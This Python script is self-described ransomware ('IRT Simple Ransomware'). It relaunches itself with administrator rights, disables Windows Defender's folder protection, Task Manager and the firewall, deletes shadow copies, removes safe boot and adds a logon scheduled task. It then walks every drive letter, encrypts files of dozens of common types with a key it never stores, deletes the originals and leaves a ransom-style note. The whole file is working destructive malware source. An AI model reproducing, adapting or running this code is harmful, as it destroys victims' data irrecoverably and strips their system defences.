import re
import ctypes
import sys
import platform
import os
import os.path
from os import path
import subprocess
from cryptography.fernet import Fernet


startupInfo = subprocess.STARTUPINFO()
startupInfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

vss = subprocess.STARTUPINFO()
vss.dwFlags |= subprocess.STARTF_USESHOWWINDOW

full_path = os.path.realpath(__file__)

#Gaining Admin Access
def UAC():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if UAC():

    try:
    # Bypass Windows 10 Anti Ransomware
        if platform.release() == "10":
            subprocess.call('powershell.exe -command "& {Set-MpPreference -EnableControlledFolderAccess Disabled}"', startupinfo=startupInfo)

        else:
            pass
            # Disable Task Manager
        subprocess.call(r'REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
            #Disable Firewall
        subprocess.call('NetSh Advfirewall set allprofiles state off')
        # Remove User System Restor Point
        subprocess.call('vssadmin delete shadows /all ', startupinfo=vss)
        # Add Program to Task manager
        subprocess.call('schtasks /create /sc onlogon /tn 0k /tr ' + full_path)
        # Disable Safe Mode
        subprocess.call(r'C:\Windows\Sysnative\bcdedit ' +' /DELETEVALUE {DEFAULT} SAFEBOOT')

    except Exception as exception:
        pass

else:

    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)

key = Fernet.generate_key()

my_drives_list = ['D:', 'F:', 'G:', 'H:', 'I:', 'J:', 'K:', 'L:', 'M:', 'N:', 'O:','P:', 'Q:', 'R:', 'S:', 'E:', 'T:', 'U:', 'X:', 'Y:', 'A:', 'B:', 'K:', 'C:', '/']


All_Files = [
    'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', 'exe', 'PNG', 'JPG','svg' ,'dll',
    'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape',
    'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',

    'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx',
    'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',
    'yml', 'yaml', 'json', 'xml', 'csv',
    'db', 'sql', 'dbf', 'mdb', 'iso','log',

    'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',
    'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',
    'java', 'class', 'jar',
    'ps', 'bat', 'vb',
    'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',
    'go', 'py', 'pyc', 'bf', 'coffee',

    'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak','RAR'
]
for My_All_List in my_drives_list :

    for dirpath, dirs, files in os.walk(My_All_List):
        for i in files:
            My_Real_Path = os.path.abspath(os.path.join(dirpath, i))
            ext = My_Real_Path.split('.')[-1]
            if ext in All_Files:
                #print(My_Real_Path)
                files_path = i
                try:
                    with open(files_path,'rb') as fopen:
                        files = fopen.read()
                    fernet = Fernet(key)
                    Encrypt = fernet.encrypt(files)
                    with open(files_path+".0P3N3R",'wb') as fopen:
                        fopen.write(Encrypt)
                    os.remove(files_path)
                except Exception as exception:
                    continue

with open ('Your_Files_Encrypted.txt','w') as fopen :
    fopen.write("""Hello ... Your Files Encrypted bY : IRT Simple Ransomware
    My Github Page : https://github.com/0p3n3r
    """)
